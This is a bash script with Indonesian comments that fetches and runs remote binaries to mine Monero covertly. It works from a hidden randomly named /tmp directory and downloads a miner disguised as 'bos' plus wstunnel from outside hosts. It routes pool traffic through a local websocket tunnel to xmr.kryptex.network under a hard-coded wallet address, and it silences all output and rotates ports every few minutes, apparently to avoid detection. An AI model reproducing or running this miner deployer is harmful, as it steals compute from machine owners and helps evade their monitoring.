#!/bin/bash
set -eu  # <-- HAPUS pipefail!
umask 077

find_free_port() {
    local port
    while true; do
        port=$(shuf -i 1024-65535 -n 1 2>/dev/null || echo $(( (RANDOM % 64512) + 1024 )))
        # Pake nc (netcat) – kalo nc gak ada, fallback ke bash /dev/tcp
        if command -v nc >/dev/null 2>&1; then
            if nc -z 127.0.0.1 "$port" 2>/dev/null; then
                continue
            else
                echo "$port"
                return 0
            fi
        else
            # Fallback: coba bind pake timeout + bash
            if timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
                continue
            else
                echo "$port"
                return 0
            fi
        fi
    done
}

echo "[PRE] Bersihkan..."
pkill -f wstunnel 2>/dev/null || true
pkill -f bos 2>/dev/null || true
sleep 1

WORKDIR="/tmp/.$(tr -dc 'a-z0-9' < /dev/urandom | head -c 12)"
echo "[DEBUG] WORKDIR=$WORKDIR"
mkdir -p "$WORKDIR" || exit 1
cd "$WORKDIR" || exit 1

SRV_PORT=$(find_free_port)
CLI_PORT=$(find_free_port)
echo "[INFO] SRV=$SRV_PORT, CLI=$CLI_PORT"

# Download, extract, run (copy dari v8)
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
curl -L --retry 3 --max-time 30 -H "User-Agent: $UA" -O https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz || exit 1
curl -L --retry 3 --max-time 20 -H "User-Agent: $UA" -o bos https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos || exit 1
tar -xf wstunnel_10.5.2_linux_amd64.tar.gz || exit 1
chmod +x wstunnel bos
rm -f wstunnel_10.5.2_linux_amd64.tar.gz

nohup ./wstunnel server ws://127.0.0.1:$SRV_PORT </dev/null >/dev/null 2>&1 &
PID_SRV=$!
sleep 1
if ! kill -0 $PID_SRV 2>/dev/null; then echo "[ERROR] Server mati"; exit 1; fi

nohup ./wstunnel client -L "tcp://127.0.0.1:$CLI_PORT:xmr.kryptex.network:7029" ws://127.0.0.1:$SRV_PORT </dev/null >/dev/null 2>&1 &
PID_CLI=$!
sleep 2

nohup ./bos -o "127.0.0.1:$CLI_PORT" -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" -t 7 </dev/null >/dev/null 2>&1 &
PID_MINE=$!

echo "[OK] SEMUA JALAN. Rotasi 5 menit."

# ROTASI
(
  while true; do
    sleep $((300 + RANDOM % 60))
    NEW_SRV=$(find_free_port)
    NEW_CLI=$(find_free_port)
    kill -TERM $PID_SRV $PID_CLI 2>/dev/null || true
    sleep 0.5
    nohup ./wstunnel server ws://127.0.0.1:$NEW_SRV </dev/null >/dev/null 2>&1 &
    PID_SRV=$!
    nohup ./wstunnel client -L "tcp://127.0.0.1:$NEW_CLI:xmr.kryptex.network:7029" ws://127.0.0.1:$NEW_SRV </dev/null >/dev/null 2>&1 &
    PID_CLI=$!
    sleep 1
    kill -9 $PID_MINE 2>/dev/null || true
    nohup ./bos -o "127.0.0.1:$NEW_CLI" -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" -t 3 </dev/null >/dev/null 2>&1 &
    PID_MINE=$!
    echo "[ROTASI] $(date +%H:%M:%S) -> $NEW_SRV / $NEW_CLI" > /dev/stderr
  done
) &

wait
